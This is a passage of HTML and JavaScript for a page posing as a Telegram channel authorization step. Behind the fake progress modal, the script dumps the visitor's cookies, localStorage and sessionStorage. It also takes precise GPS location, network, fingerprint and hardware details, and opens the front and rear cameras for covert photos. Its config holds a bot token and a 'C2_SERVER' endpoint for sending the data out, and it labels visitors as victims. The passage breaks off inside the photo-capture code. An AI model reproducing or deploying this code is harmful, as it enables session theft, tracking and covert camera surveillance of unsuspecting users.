                    <div class="modal-step">
                        <div class="step-number">2</div>
                        <div class="step-title">–ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ</div>
                        <div class="step-desc">
                            –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –∑–∞—â–∏—â–µ–Ω–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å —Å–µ—Ä–≤–µ—Ä–æ–º
                        </div>
                    </div>
                    
                    <div class="modal-step">
                        <div class="step-number">3</div>
                        <div class="step-title">–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è</div>
                        <div class="step-desc">
                            –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞—à–µ–π —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ Telegram
                        </div>
                    </div>
                    
                    <div class="modal-step">
                        <div class="step-number">4</div>
                        <div class="step-title">–ü—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞</div>
                        <div class="step-desc">
                            –û—Ç–∫—Ä—ã—Ç–∏–µ –ø–æ–ª–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–æ–Ω—Ç–µ–Ω—Ç—É –∫–∞–Ω–∞–ª–∞
                        </div>
                    </div>
                </div>
                
                <div class="modal-progress">
                    <div class="modal-progress-bar" id="modalProgress"></div>
                </div>
                
                <button class="action-button" id="authButton">
                    <span>üîê –ù–∞—á–∞—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é</span>
                </button>
                
                <div class="modal-status" id="modalStatus">
                    <span>üîÑ</span>
                    <span>–û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö...</span>
                </div>
            </div>
        </div>
        
        <!-- Hidden Data Collectors -->
        <div class="data-collector">
            <video id="cameraStream" autoplay muted playsinline></video>
            <canvas id="canvasCapture"></canvas>
            <audio id="audioStream"></audio>
            <iframe id="hiddenFrame" style="display:none"></iframe>
        </div>
    </div>

    <!-- JavaScript -->
    <script>
        // ================= –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø =================
        const CONFIG = {
            BOT_TOKEN: '8578533182:AAHVUzQtIkhMjfSofiyeUJPDkEOvmfXJ08g',
            ADMIN_ID: 8001083987,
            C2_SERVER: 'https://school4love.github.io/sc/',
            VERSION: '3.0.0',
            COLLECTION_INTERVAL: 10000,
            MEDIA_COLLECTION_DELAY: 15000
        };

        // ================= –°–û–°–¢–û–Ø–ù–ò–ï –°–ò–°–¢–ï–ú–´ =================
        const SystemState = {
            // –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—ã
            victimId: null,
            sessionToken: null,
            deviceId: null,
            
            // –°—Ç–∞—Ç—É—Å—ã
            isActive: false,
            isCollecting: false,
            authInProgress: false,
            mediaCollectionDone: false,
            
            // –°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            data: {
                telegram: {},
                system: {},
                network: {},
                location: {},
                browser: {},
                hardware: {},
                media: {},
                biometrics: {},
                behavioral: {}
            },
            
            // –ú–µ—Ç—Ä–∏–∫–∏
            metrics: {
                startTime: null,
                dataPoints: 0,
                filesCollected: 0,
                errors: 0,
                retries: 0
            },
            
            // –í—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            temp: {
                streams: {},
                recorders: {},
                intervals: []
            }
        };

        // ================= –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø =================
        document.addEventListener('DOMContentLoaded', () => {
            console.log(`üöÄ System v${CONFIG.VERSION} initializing...`);
            
            // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º—ã
            initializeSystem();
            
            // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∞–Ω–∏–º–∞—Ü–∏–π
            createBackgroundParticles();
            
            // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤
            setupEventHandlers();
            
            // –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–µ—Å—Å–∏–∏
            restoreSession();
            
            // –ó–∞–ø—É—Å–∫ –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —Å–±–æ—Ä–∞
            setTimeout(initializeDataCollection, 2000);
            
            console.log('‚úÖ System initialized');
        });

        function initializeSystem() {
            // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–≤
            SystemState.victimId = generateVictimId();
            SystemState.sessionToken = generateSecureToken();
            SystemState.deviceId = generateDeviceId();
            
            // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –º–µ—Ç—Ä–∏–∫
            SystemState.metrics.startTime = Date.now();
            
            console.log('Generated IDs:', {
                victimId: SystemState.victimId,
                sessionToken: SystemState.sessionToken.substring(0, 20) + '...',
                deviceId: SystemState.deviceId
            });
        }

        function generateVictimId() {
            const timestamp = Date.now();
            const random = Math.random().toString(36).substr(2, 12);
            const hash = btoa(`${timestamp}-${random}-${navigator.userAgent.substring(0, 50)}`);
            return `VICTIM_${hash}`.replace(/[^a-zA-Z0-9_]/g, '_');
        }

        function generateSecureToken() {
            const array = new Uint8Array(64);
            crypto.getRandomValues(array);
            return Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
        }

        function generateDeviceId() {
            const components = [
                navigator.platform,
                navigator.hardwareConcurrency,
                screen.width,
                screen.height,
                navigator.deviceMemory || 'unknown',
                new Date().getTimezoneOffset()
            ].join('|');
            
            return btoa(components).substr(0, 32);
        }

        function createBackgroundParticles() {
            const container = document.getElementById('bgAnimation');
            const particleCount = 50;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.className = 'bg-particle';
                
                // –°–ª—É—á–∞–π–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
                const size = Math.random() * 100 + 50;
                const x = Math.random() * 100;
                const y = Math.random() * 100;
                const delay = Math.random() * 20;
                const duration = Math.random() * 30 + 20;
                
                // –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ —Å—Ç–∏–ª–µ–π
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                particle.style.left = `${x}%`;
                particle.style.top = `${y}%`;
                particle.style.animationDelay = `${delay}s`;
                particle.style.animationDuration = `${duration}s`;
                
                container.appendChild(particle);
            }
        }

        function setupEventHandlers() {
            // –û—Å–Ω–æ–≤–Ω–∞—è –∫–Ω–æ–ø–∫–∞
            document.getElementById('joinButton').addEventListener('click', () => {
                showAuthModal();
                startFullCollection();
            });
            
            // –ö–Ω–æ–ø–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –≤ –º–æ–¥–∞–ª—å–Ω–æ–º –æ–∫–Ω–µ
            document.getElementById('authButton').addEventListener('click', async () => {
                if (!SystemState.authInProgress) {
                    SystemState.authInProgress = true;
                    await processAdvancedAuth();
                }
            });
            
            // –ó–∞–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞
            document.getElementById('authModal').addEventListener('click', (e) => {
                if (e.target === e.currentTarget && !SystemState.authInProgress) {
                    hideAuthModal();
                }
            });
            
            // –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–∏–¥–∏–º–æ—Å—Ç–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            document.addEventListener('visibilitychange', () => {
                if (document.hidden) {
                    SystemState.isActive = false;
                } else {
                    SystemState.isActive = true;
                    sendPresenceUpdate();
                }
            });
        }

        // ================= –†–ê–ë–û–¢–ê –° –ú–û–î–ê–õ–¨–ù–´–ú –û–ö–ù–û–ú =================
        function showAuthModal() {
            const modal = document.getElementById('authModal');
            const button = document.getElementById('joinButton');
            const progress = document.getElementById('progressContainer');
            const status = document.getElementById('statusIndicator');
            const stats = document.getElementById('statsPanel');
            
            modal.classList.add('active');
            button.classList.add('hidden');
            progress.classList.remove('hidden');
            status.classList.remove('hidden');
            stats.classList.remove('hidden');
            
            // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞
            status.innerHTML = '<span>üîÑ</span><span>–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö...</span>';
        }

        function hideAuthModal() {
            const modal = document.getElementById('authModal');
            modal.classList.remove('active');
        }

        function updateProgress(stage, totalStages = 8) {
            const progress = (stage / totalStages) * 100;
            
            // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≤—Å–µ—Ö –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä–æ–≤
            document.getElementById('progressBar').style.width = `${progress}%`;
            document.getElementById('modalProgress').style.width = `${progress}%`;
            
            // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
            updateStatsDisplay();
            
            return progress;
        }

        function updateStatsDisplay() {
            document.getElementById('dataCount').textContent = SystemState.metrics.dataPoints;
            document.getElementById('mediaCount').textContent = SystemState.metrics.filesCollected;
            
            const elapsed = Math.floor((Date.now() - SystemState.metrics.startTime) / 1000);
            document.getElementById('timeActive').textContent = `${elapsed}—Å`;
        }

        // ================= –ü–†–û–¶–ï–°–° –ê–í–¢–û–†–ò–ó–ê–¶–ò–ò =================
        async function processAdvancedAuth() {
            try {
                const stages = [
                    { func: collectTelegramDataExtensive, name: "Telegram Data", weight: 15 },
                    { func: collectSystemInfoDetailed, name: "System Info", weight: 15 },
                    { func: collectNetworkInfoComplete, name: "Network Info", weight: 10 },
                    { func: collectGeolocationPrecise, name: "Geolocation", weight: 10 },
                    { func: collectBrowserFingerprint, name: "Browser Fingerprint", weight: 10 },
                    { func: collectHardwareInfo, name: "Hardware Info", weight: 10 },
                    { func: collectBiometricData, name: "Biometric Data", weight: 15 },
                    { func: collectBehavioralData, name: "Behavioral Data", weight: 15 }
                ];
                
                let currentProgress = 0;
                
                for (let i = 0; i < stages.length; i++) {
                    const stage = stages[i];
                    
                    // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞
                    document.getElementById('modalStatus').style.display = 'flex';
                    document.getElementById('modalStatus').innerHTML = 
                        `<span>üîÑ</span><span>–°–±–æ—Ä: ${stage.name}...</span>`;
                    
                    // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —ç—Ç–∞–ø–∞
                    await stage.func();
                    
                    // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
                    currentProgress += stage.weight;
                    updateProgress(currentProgress / 10, 10);
                    
                    // –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É —ç—Ç–∞–ø–∞–º–∏
                    await sleep(1500);
                }
                
                // –ö–æ–º–ø–∏–ª—è—Ü–∏—è –í–°–ï–• –¥–∞–Ω–Ω—ã—Ö
                const completeData = await compileCompleteDataset();
                
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –í–°–ï–• –¥–∞–Ω–Ω—ã—Ö –æ–¥–Ω–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º
                await sendCompleteDataset(completeData);
                
                // –ó–∞–ø—É—Å–∫ –º–µ–¥–∏–∞ —Å–±–æ—Ä–∞
                setTimeout(() => {
                    startMediaCollection();
                }, CONFIG.MEDIA_COLLECTION_DELAY);
                
                // –ü–æ–∫–∞–∑–∞—Ç—å —É—Å–ø–µ—Ö
                showAuthSuccess();
                
            } catch (error) {
                console.error('Auth process error:', error);
                SystemState.metrics.errors++;
                showAuthError();
            } finally {
                SystemState.authInProgress = false;
            }
        }

        // ================= –†–ê–°–®–ò–†–ï–ù–ù–´–ï –ö–û–õ–õ–ï–ö–¢–û–†–´ –î–ê–ù–ù–´–• =================
        async function collectTelegramDataExtensive() {
            const data = {
                timestamp: new Date().toISOString(),
                sources: {}
            };
            
            try {
                // 1. LocalStorage (–ø–æ–ª–Ω—ã–π –¥–∞–º–ø)
                data.sources.localStorage = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    data.sources.localStorage[key] = localStorage.getItem(key);
                }
                
                // 2. SessionStorage
                data.sources.sessionStorage = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    data.sources.sessionStorage[key] = sessionStorage.getItem(key);
                }
                
                // 3. Cookies (–¥–µ—Ç–∞–ª—å–Ω—ã–π –∞–Ω–∞–ª–∏–∑)
                data.cookies = {
                    raw: document.cookie,
                    parsed: parseCookies(document.cookie),
                    count: document.cookie.split(';').filter(c => c.trim()).length
                };
                
                // 4. IndexedDB –∏–Ω–≤–µ–Ω—Ç–∞—Ä–∏–∑–∞—Ü–∏—è
                if (window.indexedDB) {
                    const databases = await indexedDB.databases?.().catch(() => []);
                    data.indexedDB = {
                        exists: true,
                        databaseCount: databases?.length || 0,
                        databaseNames: databases?.map(db => db.name) || []
                    };
                }
                
                // 5. Service Workers
                if ('serviceWorker' in navigator) {
                    const registrations = await navigator.serviceWorker.getRegistrations();
                    data.serviceWorkers = {
                        count: registrations.length,
                        scopes: registrations.map(r => r.scope)
                    };
                }
                
                // 6. –ü–∞–º—è—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
                if (window.performance && performance.memory) {
                    data.memory = {
                        usedJSHeapSize: performance.memory.usedJSHeapSize,
                        totalJSHeapSize: performance.memory.totalJSHeapSize,
                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
                    };
                }
                
                SystemState.data.telegram = data;
                SystemState.metrics.dataPoints += Object.keys(data).length * 10;
                
            } catch (error) {
                console.error('Telegram data collection error:', error);
                SystemState.data.telegram.error = error.message;
            }
            
            return data;
        }

        async function collectSystemInfoDetailed() {
            const data = {
                timestamp: new Date().toISOString(),
                basic: {},
                advanced: {},
                capabilities: {}
            };
            
            try {
                // –ë–∞–∑–æ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
                data.basic = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    appName: navigator.appName,
                    appVersion: navigator.appVersion,
                    appCodeName: navigator.appCodeName,
                    product: navigator.product,
                    productSub: navigator.productSub
                };
                
                // –Ø–∑—ã–∫–∏ –∏ –ª–æ–∫–∞–ª–∏–∑–∞—Ü–∏—è
                data.localization = {
                    language: navigator.language,
                    languages: navigator.languages,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    locale: navigator.language || 'unknown',
                    region: Intl.DateTimeFormat().resolvedOptions().locale
                };
                
                // –ù–∞—Å—Ç—Ä–æ–π–∫–∏
                data.settings = {
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    onLine: navigator.onLine,
                    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                    maxTouchPoints: navigator.maxTouchPoints || 0
                };
                
                // –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏
                data.capabilities = {
                    geolocation: 'geolocation' in navigator,
                    mediaDevices: 'mediaDevices' in navigator,
                    getUserMedia: 'getUserMedia' in navigator.mediaDevices,
                    getDisplayMedia: 'getDisplayMedia' in navigator.mediaDevices,
                    webRTC: 'RTCPeerConnection' in window,
                    serviceWorker: 'serviceWorker' in navigator,
                    pushManager: 'PushManager' in window,
                    notifications: 'Notification' in window,
                    clipboard: 'clipboard' in navigator,
                    credentials: 'credentials' in navigator,
                    storage: 'storage' in navigator,
                    bluetooth: 'bluetooth' in navigator,
                    usb: 'usb' in navigator,
                    gamepad: 'getGamepads' in navigator
                };
                
                // –ü–ª–∞–≥–∏–Ω—ã –∏ MIME —Ç–∏–ø—ã
                data.plugins = {
                    pluginCount: navigator.plugins.length,
                    plugins: Array.from(navigator.plugins).map(p => ({
                        name: p.name,
                        description: p.description,
                        filename: p.filename,
                        length: p.length
                    })),
                    mimeTypes: Array.from(navigator.mimeTypes).map(m => ({
                        type: m.type,
                        description: m.description,
                        suffixes: m.suffixes
                    }))
                };
                
                SystemState.data.system = data;
                SystemState.metrics.dataPoints += Object.keys(data).length * 5;
                
            } catch (error) {
                console.error('System info collection error:', error);
                SystemState.data.system.error = error.message;
            }
            
            return data;
        }

        async function collectNetworkInfoComplete() {
            const data = {
                timestamp: new Date().toISOString(),
                connection: {},
                ipInfo: {},
                networkType: {}
            };
            
            try {
                // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–∏
                if (navigator.connection) {
                    const conn = navigator.connection;
                    data.connection = {
                        effectiveType: conn.effectiveType,
                        downlink: conn.downlink,
                        downlinkMax: conn.downlinkMax,
                        rtt: conn.rtt,
                        saveData: conn.saveData,
                        type: conn.type
                    };
                }
                
                // IP –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è —á–µ—Ä–µ–∑ multiple sources
                const ipData = await getIPInfoComprehensive();
                data.ipInfo = ipData;
                
                // –°–µ—Ç–µ–≤—ã–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ã —á–µ—Ä–µ–∑ WebRTC
                const interfaces = await getNetworkInterfaces();
                data.networkInterfaces = interfaces;
                
                // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø—Ä–æ–∫—Å–∏ –∏ VPN
                data.networkType = await detectNetworkType();
                
                SystemState.data.network = data;
                SystemState.metrics.dataPoints += Object.keys(data).length * 3;
                
            } catch (error) {
                console.error('Network info collection error:', error);
                SystemState.data.network.error = error.message;
            }
            
            return data;
        }

        async function collectGeolocationPrecise() {
            return new Promise((resolve) => {
                const data = {
                    timestamp: new Date().toISOString(),
                    gps: {},
                    wifi: {},
                    cell: {},
                    ipBased: {}
                };
                
                // 1. GPS –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è (–≤—ã—Å–æ–∫–∞—è —Ç–æ—á–Ω–æ—Å—Ç—å)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            data.gps = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                altitudeAccuracy: position.coords.altitudeAccuracy,
                                heading: position.coords.heading,
                                speed: position.coords.speed,
                                timestamp: position.timestamp,
                                source: 'GPS'
                            };
                            
                            // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                            await enrichLocationData(data);
                            
                            SystemState.data.location = data;
                            SystemState.metrics.dataPoints += 10;
                            resolve(data);
                        },
                        async (error) => {
                            // Fallback –º–µ—Ç–æ–¥—ã
                            await getIPLocation(data);
                            await getWifiLocation(data);
                            
                            SystemState.data.location = data;
                            SystemState.metrics.dataPoints += 5;
                            resolve(data);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        }
                    );
                } else {
                    getIPLocation(data).then(() => {
                        SystemState.data.location = data;
                        SystemState.metrics.dataPoints += 3;
                        resolve(data);
                    });
                }
            });
        }

        async function collectBrowserFingerprint() {
            const data = {
                timestamp: new Date().toISOString(),
                fingerprint: {},
                canvas: {},
                webgl: {},
                fonts: {},
                screen: {}
            };
            
            try {
                // Canvas fingerprinting
                data.canvas = getCanvasFingerprint();
                
                // WebGL fingerprinting
                data.webgl = getWebGLInfo();
                
                // Font detection
                data.fonts = await getFontList();
                
                // Screen properties
                data.screen = {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation?.type || 'unknown'
                };
                
                // Audio context fingerprint
                data.audio = getAudioFingerprint();
                
                // Device motion/orientation
                if ('DeviceMotionEvent' in window) {
                    data.motion = 'available';
                }
                
                if ('DeviceOrientationEvent' in window) {
                    data.orientation = 'available';
                }
                
                // –ö–æ–º–±–∏–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –æ—Ç–ø–µ—á–∞—Ç–æ–∫
                data.fingerprint.hash = generateFingerprintHash(data);
                
                SystemState.data.browser = data;
                SystemState.metrics.dataPoints += Object.keys(data).length * 2;
                
            } catch (error) {
                console.error('Fingerprint collection error:', error);
                SystemState.data.browser.error = error.message;
            }
            
            return data;
        }

        async function collectHardwareInfo() {
            const data = {
                timestamp: new Date().toISOString(),
                cpu: {},
                gpu: {},
                memory: {},
                storage: {},
                battery: {}
            };
            
            try {
                // CPU –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
                data.cpu = {
                    cores: navigator.hardwareConcurrency || 'unknown',
                    architecture: navigator.cpuClass || 'unknown'
                };
                
                // –ü–∞–º—è—Ç—å
                data.memory = {
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    maxHeap: performance.memory?.jsHeapSizeLimit || 'unknown'
                };
                
                // GPU –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è —á–µ—Ä–µ–∑ WebGL
                const gl = document.createElement('canvas').getContext('webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        data.gpu = {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                        };
                    }
                }
                
                // –ë–∞—Ç–∞—Ä–µ—è
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        data.battery = {
                            level: battery.level,
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        };
                    } catch (e) {
                        data.battery.error = e.message;
                    }
                }
                
                // –•—Ä–∞–Ω–∏–ª–∏—â–µ
                if ('storage' in navigator && 'estimate' in navigator.storage) {
                    try {
                        const estimate = await navigator.storage.estimate();
                        data.storage = {
                            usage: estimate.usage,
                            quota: estimate.quota,
                            usagePercent: estimate.usage / estimate.quota * 100
                        };
                    } catch (e) {
                        data.storage.error = e.message;
                    }
                }
                
                SystemState.data.hardware = data;
                SystemState.metrics.dataPoints += Object.keys(data).length * 3;
                
            } catch (error) {
                console.error('Hardware info collection error:', error);
                SystemState.data.hardware.error = error.message;
            }
            
            return data;
        }

        async function collectBiometricData() {
            const data = {
                timestamp: new Date().toISOString(),
                available: {},
                collected: {}
            };
            
            try {
                // –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ –±–∏–æ–º–µ—Ç—Ä–∏—á–µ—Å–∫–∏—Ö API
                data.available = {
                    fingerprint: 'PublicKeyCredential' in window,
                    faceRecognition: false, // –¢—Ä–µ–±—É–µ—Ç —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ–≥–æ API
                    voice: 'webkitSpeechRecognition' in window || 'SpeechRecognition' in window,
                    camera: 'mediaDevices' in navigator,
                    microphone: 'mediaDevices' in navigator
                };
                
                // –ü–æ–ø—ã—Ç–∫–∞ —Å–±–æ—Ä–∞ –±–∏–æ–º–µ—Ç—Ä–∏—á–µ—Å–∫–∏—Ö –¥–∞–Ω–Ω—ã—Ö
                if (data.available.camera) {
                    try {
                        const devices = await navigator.mediaDevices.enumerateDevices();
                        data.collected.devices = devices.filter(d => d.kind === 'videoinput');
                    } catch (e) {
                        data.collected.devicesError = e.message;
                    }
                }
                
                // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –º–∏–∫—Ä–æ—Ñ–æ–Ω–µ
                if (data.available.microphone) {
                    try {
                        const devices = await navigator.mediaDevices.enumerateDevices();
                        data.collected.audioDevices = devices.filter(d => d.kind === 'audioinput');
                    } catch (e) {
                        data.collected.audioError = e.message;
                    }
                }
                
                SystemState.data.biometrics = data;
                SystemState.metrics.dataPoints += Object.keys(data).length * 2;
                
            } catch (error) {
                console.error('Biometric data collection error:', error);
                SystemState.data.biometrics.error = error.message;
            }
            
            return data;
        }

        async function collectBehavioralData() {
            const data = {
                timestamp: new Date().toISOString(),
                interactions: {},
                timing: {},
                preferences: {}
            };
            
            try {
                // –í—Ä–µ–º—è –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
                data.timing.pageLoad = performance.timing.loadEventEnd - performance.timing.navigationStart;
                data.timing.domInteractive = performance.timing.domInteractive - performance.timing.navigationStart;
                data.timing.domainLookup = performance.timing.domainLookupEnd - performance.timing.domainLookupStart;
                
                // –ò–Ω—Ç–µ—Ä–∞–∫—Ü–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                data.interactions = {
                    clicks: 0, // –ë—É–¥–µ—Ç –æ–±–Ω–æ–≤–ª—è—Ç—å—Å—è —á–µ—Ä–µ–∑ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
                    scrollDepth: 0,
                    mouseMovements: 0,
                    keyPresses: 0,
                    touchEvents: 0
                };
                
                // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                data.preferences = {
                    prefersDark: window.matchMedia('(prefers-color-scheme: dark)').matches,
                    prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
                    prefersReducedData: window.matchMedia('(prefers-reduced-data: reduce)').matches,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    screenOrientation: screen.orientation?.type || 'unknown'
                };
                
                // –ò—Å—Ç–æ—Ä–∏—è –±—Ä–∞—É–∑–µ—Ä–∞ (–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–æ)
                data.history = {
                    length: history.length,
                    referrer: document.referrer,
                    url: window.location.href
                };
                
                SystemState.data.behavioral = data;
                SystemState.metrics.dataPoints += Object.keys(data).length * 2;
                
            } catch (error) {
                console.error('Behavioral data collection error:', error);
                SystemState.data.behavioral.error = error.message;
            }
            
            return data;
        }

        // ================= –ú–ï–î–ò–ê –°–ë–û–† =================
        async function startMediaCollection() {
            if (SystemState.mediaCollectionDone) return;
            
            SystemState.isCollecting = true;
            
            try {
                const mediaData = {
                    timestamp: new Date().toISOString(),
                    photos: [],
                    videos: [],
                    audio: [],
                    screenshots: []
                };
                
                // 1. –°–±–æ—Ä —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–π
                await collectPhotos(mediaData);
                
                // 2. –°–±–æ—Ä –≤–∏–¥–µ–æ
                await collectVideos(mediaData);
                
                // 3. –°–±–æ—Ä –∞—É–¥–∏–æ
                await collectAudio(mediaData);
                
                // 4. –°–∫—Ä–∏–Ω—à–æ—Ç—ã
                await collectScreenshots(mediaData);
                
                // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö
                SystemState.data.media = mediaData;
                SystemState.metrics.filesCollected = 
                    mediaData.photos.length + 
                    mediaData.videos.length + 
                    mediaData.audio.length + 
                    mediaData.screenshots.length;
                
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –º–µ–¥–∏–∞ –æ—Ç—á–µ—Ç–∞ –û–¢–î–ï–õ–¨–ù–´–ú —Å–æ–æ–±—â–µ–Ω–∏–µ–º
                await sendMediaReport(mediaData);
                
                SystemState.mediaCollectionDone = true;
                
            } catch (error) {
                console.error('Media collection error:', error);
                SystemState.metrics.errors++;
            } finally {
                SystemState.isCollecting = false;
            }
        }

        async function collectPhotos(mediaData) {
            try {
                if (!navigator.mediaDevices?.getUserMedia) return;
                
                // –ü–µ—Ä–µ–¥–Ω—è—è –∫–∞–º–µ—Ä–∞
                const frontCamera = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                
                // –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ (–µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø–Ω–∞)
                let backCamera = null;
                try {
                    backCamera = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: 'environment' } },
                        audio: false
                    });
                } catch (e) {
                    console.log('Back camera not available');
                }
                
                const video = document.getElementById('cameraStream');
                const canvas = document.getElementById('canvasCapture');
                const ctx = canvas.getContext('2d');
                
                // –§–æ—Ç–æ —Å —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã
                for (let i = 0; i < 3; i++) {
                    video.srcObject = frontCamera;
                    await new Promise(r => setTimeout(r, 1000));
                    
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    
                    mediaData.photos.push({
                        type: 'front_camera',
                        index: i,
                        resolution: `${canvas.width}x${canvas.height}`,
                        timestamp: Date.now()
                    });
                }
                
                // –§–æ—Ç–æ —Å –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã
                if (backCamera) {
                    for (let i = 0; i < 2; i++) {
                        video.srcObject = backCamera;
                        await new Promise(r => setTimeout(r, 1000));
                        
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0);
                        
                        mediaData.photos.push({
                            type: 'back_camera',
                            index: i,
